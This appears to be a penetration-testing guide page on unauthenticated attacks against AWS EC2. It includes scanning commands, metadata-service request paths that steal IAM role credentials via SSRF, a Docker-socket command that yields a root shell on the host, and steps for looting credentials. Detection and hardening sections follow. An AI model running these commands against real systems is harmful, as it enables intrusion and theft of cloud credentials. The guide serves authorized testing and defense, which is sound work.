---
cstg_id: CSTG-AWS-EC2-UNAUTH
title: "AWS Ec2 - Unauthenticated Access"
provider: aws
service: ec2
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools: [nmap, masscan, httpx, nuclei, ssh-audit, awscli-anonymous, ip-ranges-json]
references:
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AccessingInstancesLinux.html"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
  - "https://ip-ranges.amazonaws.com/ip-ranges.json"
  - "https://hackingthe.cloud/aws/exploitation/ec2-server-side-request-forgery/"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
license: CC BY-SA 4.0
---

## Summary

Amazon Elastic Compute Cloud (EC2) provides virtual machines ("instances") that run inside an account's Virtual Private Cloud (VPC). Because instances frequently expose network services to the public Internet, EC2 is one of the most common external entry points into an AWS environment. This page covers what an unauthenticated, network-only adversary can discover and reach without any AWS credentials: publicly reachable instance interfaces, exposed management ports, application-layer services, leaked instance metadata via Server-Side Request Forgery (SSRF), and orphaned/abandoned infrastructure.

The attacker objective at this phase is to (1) confirm that target hosts belong to AWS EC2, (2) map externally exposed services and their software versions, and (3) find a foothold - a vulnerable service, weak credentials, an exposed metadata path, or an unauthenticated administrative endpoint - that yields code execution on an instance or leaks credentials usable in later phases (see [Enumeration](../02-services/aws-ec2-enum.md) and [Privilege Escalation](../03-privilege-escalation/aws-ec2-privesc.md)).

## Prerequisites

- No AWS credentials. The tester operates purely from the public Internet against IP addresses and hostnames believed to belong to the target.
- A list of in-scope targets: public IP addresses, Elastic IPs, DNS names (often `ec2-<a-b-c-d>.<region>.compute.amazonaws.com` or `compute-1.amazonaws.com`), and any application domains that resolve to AWS-owned ranges.
- Authorization to scan and interact with the targets. AWS permits customer-initiated penetration testing of EC2 instances without prior approval for most services, but the tester must own/control the targets and respect AWS's published policy and rate limits.

## Enumeration

### Confirm AWS ownership of an IP

AWS publishes the authoritative list of its public ranges. Resolve a target and check whether the address falls inside an EC2 range:

```bash
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json -o ip-ranges.json

# Which AWS service/region owns a given IP?
jq -r --arg ip "203.0.113.10" '
  .prefixes[]
  | select(.service=="EC2")
  | .ip_prefix' ip-ranges.json

# Pull every EC2 prefix for a region of interest
jq -r '.prefixes[] | select(.service=="EC2" and .region=="us-east-1") | .ip_prefix' ip-ranges.json
```

The default reverse-DNS form `ec2-203-0-113-10.compute-1.amazonaws.com` also reveals an EC2-hosted address and its region. DNS reconnaissance frequently surfaces CNAMEs pointing at these names.

### Port and service scanning

```bash
# Fast port sweep of an in-scope range
masscan -p1-65535 203.0.113.0/24 --rate 1000 -oL masscan.out

# Service/version + default-script enumeration on discovered hosts
nmap -sV -sC -p- -T4 -oA ec2-scan 203.0.113.10

# Common EC2-exposed management/app ports to prioritise
# 22 (SSH), 3389 (RDP), 5985/5986 (WinRM), 2375/2376 (Docker),
# 6443/8443/10250 (Kubernetes), 5432/3306/27017/6379/9200 (datastores),
# 80/443/8080/8000 (web apps)
```

### HTTP application discovery

```bash
# Probe live web services, capture titles, tech, status
httpx -l hosts.txt -title -tech-detect -status-code -o httpx.out

# Template-based detection of known exposed panels / CVEs
nuclei -l httpx.out -t http/ -severity medium,high,critical
```

### Anonymous AWS-side checks

Some EC2-adjacent resources may be world-readable even though instances themselves are not. From an unauthenticated client, public AMIs and public EBS snapshots are queryable by anyone with any AWS account (i.e. authenticated but not authorized for the target). With no account at all, focus on DNS, network, and HTTP signals above; reserve AMI/snapshot/`describe-*` checks for the [Enumeration](../02-services/aws-ec2-enum.md) page where some credential exists.

## Misconfigurations & Findings

- **Security Groups open to `0.0.0.0/0` on management ports.** SSH (22), RDP (3389), WinRM (5985/5986), database ports, and orchestration APIs exposed Internet-wide are the single most common high-severity EC2 finding.
- **SSRF reaching the Instance Metadata Service (IMDS).** A web application running on EC2 that fetches attacker-controlled URLs can be coerced to read `http://169.254.169.254/`. On IMDSv1 (request/response, no token) this leaks the instance's IAM role credentials. This is the highest-impact unauthenticated finding because it converts a web bug into valid AWS credentials.
- **Exposed Docker daemon (2375/2376) or kubelet (10250).** Unauthenticated Docker API or read/exec-enabled kubelet allows container creation and host escape.
- **Default, weak, or reused SSH/RDP credentials**, or SSH key material committed to a reachable web root or git directory.
- **Application secrets in HTTP responses, JS bundles, `.env`, `.git/`, or directory listings** served by an instance.
- **Abandoned / orphaned instances** still reachable, often unpatched, running end-of-life software, or holding stale credentials.
- **Vulnerable network services** exposing known CVEs (unpatched web frameworks, message brokers, search clusters).

### IMDS SSRF detail

```
# IMDSv1 (token-less) - reachable via SSRF if not disabled
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 requires a PUT to obtain a token first; many naive SSRF
# primitives cannot set the X-aws-ec2-metadata-token header, which is
# precisely why enforcing IMDSv2 mitigates most SSRF credential theft.
PUT http://169.254.169.254/latest/api/token  (header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
GET http://169.254.169.254/latest/meta-data/  (header: X-aws-ec2-metadata-token: <token>)
```

The credentials returned (`AccessKeyId`, `SecretAccessKey`, `Token`) are scoped to the instance's IAM role and are immediately usable from anywhere; they move the engagement straight into the authenticated phases.

## Exploitation

1. **Direct service compromise.** Exploit a vulnerable exposed service (web app RCE, deserialization, unauthenticated admin panel) to obtain a shell on the instance.
2. **Credential brute force / reuse.** Against exposed SSH/RDP/database ports, test default and previously-leaked credentials within scope.
3. **SSRF to IMDS to AWS credentials.** Use an SSRF primitive to read the IMDS path above, extract the role credentials, and configure them locally:
   ```bash
   export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
   aws sts get-caller-identity
   ```
   From here, pivot into account enumeration and privilege escalation.
4. **Container/orchestration takeover.** Against an exposed Docker socket:
   ```bash
   docker -H tcp://203.0.113.10:2375 run -v /:/host -it alpine chroot /host sh
   ```
   This mounts the host filesystem and yields root on the instance, then access to its IMDS role.
5. **Loot the foothold.** Once on an instance, harvest `~/.aws/credentials`, environment variables, application config, and IMDS role credentials for the [Post-Exploitation](../05-post-exploitation/aws-ec2-post-exploitation.md) phase.

## Detection & Logging

- **CloudTrail does not log inbound network traffic or in-instance activity.** Unauthenticated scanning and exploitation of the OS/application are invisible to CloudTrail until the adversary uses AWS API calls (e.g. after stealing IMDS credentials).
- **First AWS-visible signal** is typically `sts:GetCallerIdentity` or other API calls made with the stolen instance-role credentials, especially from an IP outside the instance/VPC. GuardDuty's `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` finding fires when instance role credentials are used from an external IP, and `CredentialAccess`/`Recon` findings cover related behaviour.
- **VPC Flow Logs** record the inbound connections (source IP, port, accept/reject) and are the primary network evidence of scanning and exploitation attempts.
- **AWS WAF / ALB / CloudFront logs** capture the HTTP requests behind a web exploit or SSRF, including the outbound metadata URL pattern if logged.
- **OS/application logs** (sshd auth logs, web server access logs) on the instance hold the on-host evidence but are not centralised unless shipped to CloudWatch Logs.

## Remediation & Hardening

- **Enforce IMDSv2 and reduce the hop limit.** Set `HttpTokens=required` and `HttpPutResponseHopLimit=1` on every instance; disable IMDS entirely where unused. This blocks the dominant SSRF-to-credential path.
- **Least-privilege Security Groups.** No `0.0.0.0/0` on management ports. Front administrative access with SSM Session Manager (no inbound ports), a bastion, or VPN; restrict app ports to required CIDRs.
- **Patch and minimise the external surface.** Keep instances patched, remove unused services, and prefer private subnets with NAT egress over public IPs.
- **No long-lived credentials on instances.** Use instance roles, not embedded keys; never bake credentials into AMIs or user-data.
- **WAF and SSRF defenses** in front of web apps; validate/deny outbound requests to link-local (`169.254.169.254`) and metadata ranges at the application and egress layers.
- **Decommission orphaned instances and release unused Elastic IPs** to shrink the attack surface.

## Tools

- Network discovery: `nmap`, `masscan`.
- Web probing/detection: `httpx`, `nuclei`.
- SSH posture: `ssh-audit`.
- AWS attribution: the published `ip-ranges.json` dataset and reverse DNS.

## References

- AWS EC2 concepts and access documentation (see frontmatter URLs).
- AWS instance metadata retrieval and IMDSv2 configuration docs.
- AWS published IP ranges dataset.
- hackingthe.cloud - EC2 SSRF to IMDS credential theft.
